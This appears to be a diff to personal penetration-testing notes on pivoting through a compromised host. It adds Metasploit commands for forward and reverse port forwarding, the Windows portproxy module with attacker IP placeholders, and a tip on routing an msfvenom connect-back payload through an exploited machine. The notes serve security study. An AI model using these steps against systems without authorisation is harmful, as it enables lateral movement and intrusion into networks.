@@ -66,7 +66,9 @@ sudo proxychains nmap -sT -Pn -n <targetIP> --top-ports 50
 
 ## Portforwarding
 
-> Using metaslpoit
+> This is crucial if we want to reach another machine not capable of reaching the web or the IP-Range where the attacker resides!
+> 
+> Using metasploit
 
 ```bash
 meterpreter> portfwd add -l <localPort> -r <targetIP> -p <targetPort>
@@ -79,3 +81,43 @@ Example above: `RDP` connect to local port 3333 will actually goto 10.0.0.15:338
 
 Listener on attacker machine forwarding traffic to the target over the compromised host. Requires an already exploited victim to use as intermediary.
 
+**IMPORTANT:**
+This procedure is possible on linux and windows - BUT it will block the port on the attacker machine (so  you can jump from your local 3333 to the remote target machine 3389):
+
+```bash
+netstat -tulpn
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      54056/ruby          
+```
+
+### REVERSE portforwarding
+
+> So the target machine has a route back over the exploited machine
+
+```bash
+# meterpreter on the exploited machine 10.10.10.15
+meterpreter> portfwd add -l <attackerPort> -L <attackerIP> -p <exploitedMachinePort> -R  # -R indicating reverse portfwd
+```
+
+### For Windows
+
+> Using meterpreter (again) -> routes to the remote NW should already exist
+
+```bash
+msf> use post/windows/manage/portproxy
+msf> set connect_port 3333 <attackerPort>
+msf> set connect_address <attackerIP>
+msf> set local_address <exploitedMachine> # 10.10.10.15 in above img
+msf> set local_port <exploitMachinePort> # 3333 or 3389 as seen above
+msf> set session 1 # meterpreter session playing the proxy
+```
+
+Traffice is piped over the exploited machine from the target machine to the attacker!
+
+### Followup
+
+> You can address an exploited machine as receiving end of an exploit -> but only if there is already meterpreter running on it and the traffic is forwarded to the attacker
+
+For ease of use we can create a payload with msfvenom pointing to the exploited machine (which forwards the traffic on the specific port to the attacker IP) -> upload (this port must also be forwarded) and execute on the new target to get a connect-back in metasploit.
